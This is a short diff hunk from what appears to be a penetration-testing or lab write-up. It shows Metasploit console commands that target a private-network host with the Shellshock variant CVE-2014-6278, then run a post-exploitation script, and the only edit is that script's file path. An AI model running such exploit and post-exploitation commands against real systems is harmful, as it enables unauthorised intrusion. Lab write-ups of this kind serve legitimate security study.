@@ -53,7 +53,7 @@ set RHOST 172.16.2.44
 set LPORT 4444
 set CVE CVE-2014-6278
 exploit
-sessions -i 1 -s /home/kali/targetz/sumo_post.sh
+sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh
 ```
 
 ### sumo_post.sh (post exploitation script)
